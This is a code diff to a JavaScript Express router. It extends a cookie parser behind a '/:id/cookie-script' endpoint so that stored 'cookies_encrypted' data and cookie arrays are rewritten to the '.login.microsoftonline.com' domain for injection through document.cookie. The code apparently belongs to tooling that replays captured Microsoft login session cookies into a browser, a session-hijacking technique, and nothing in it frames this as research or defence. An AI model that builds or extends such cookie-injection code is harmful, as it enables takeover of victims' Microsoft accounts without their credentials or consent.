@@ -389,8 +389,11 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
   }
 });
 
-// ─── Parse cookie string into array of cookie objects ───────────────
-// Enhanced: Supports tenant and account type for proper domain handling
+// ─── Parse cookie string/array into array of cookie objects ─────────
+// Handles three input formats:
+//   1. Array of cookie objects (from formatCookiesForInjection)
+//   2. JSON string of array (from stored cookies_encrypted)
+//   3. Legacy cookie string "name=value; name2=value2"
 function parseCookies(cookieString, options) {
   if (!cookieString) return [];
 
@@ -398,7 +401,58 @@ function parseCookies(cookieString, options) {
   var tenant = options.tenant || 'common';
   var accountType = options.accountType || 'unknown';
 
-  // Build domain map for proper cookie domain assignment
+  // Normalize domain for document.cookie compatibility.
+  // document.cookie CANNOT set parent-domain cookies (.microsoftonline.com).
+  // Must use .login.microsoftonline.com (the exact host or its subdomains).
+  function normalizeDomainForDocCookie(domain) {
+    if (!domain) return '.login.microsoftonline.com';
+    if (domain === '.microsoftonline.com' || domain === 'microsoftonline.com') {
+      return '.login.microsoftonline.com';
+    }
+    if (domain === '.login.microsoftonline.com' || domain === 'login.microsoftonline.com') {
+      return '.login.microsoftonline.com';
+    }
+    // Tenant-specific domains: normalize to .login.microsoftonline.com for document.cookie
+    if (domain && domain.indexOf('microsoftonline.com') !== -1) {
+      return '.login.microsoftonline.com';
+    }
+    return domain;
+  }
+
+  // Case 1: Already an array of cookie objects
+  if (Array.isArray(cookieString)) {
+    return cookieString.map(function(c) {
+      return {
+        name: c.name,
+        value: c.value,
+        domain: normalizeDomainForDocCookie(c.domain),
+        path: c.path || '/',
+        sameSite: c.sameSite || 'None',
+      };
+    }).filter(function(c) { return c.name && c.value; });
+  }
+
+  // Case 2: JSON string of an array (from stored cookies_encrypted)
+  if (typeof cookieString === 'string' && cookieString.charAt(0) === '[') {
+    try {
+      var parsed = JSON.parse(cookieString);
+      if (Array.isArray(parsed)) {
+        return parsed.map(function(c) {
+          return {
+            name: c.name,
+            value: c.value,
+            domain: normalizeDomainForDocCookie(c.domain),
+            path: c.path || '/',
+            sameSite: c.sameSite || 'None',
+          };
+        }).filter(function(c) { return c.name && c.value; });
+      }
+    } catch (e) {
+      // Not valid JSON, fall through to string parsing
+    }
+  }
+
+  // Case 3: Legacy cookie string parsing
   var domainMap = buildCookieDomainMap(tenant, accountType);
 
   var seenNames = {};
@@ -423,7 +477,7 @@ function parseCookies(cookieString, options) {
       if (!value || value.length === 0) continue;
 
       // Assign proper domain based on cookie name
-      var assignedDomain = domainMap.getDomain(name);
+      var assignedDomain = normalizeDomainForDocCookie(domainMap.getDomain(name));
 
       // Store unique cookies by lowercase name (last occurrence wins)
       seenNames[nameLower] = { name: name, value: value, domain: assignedDomain };
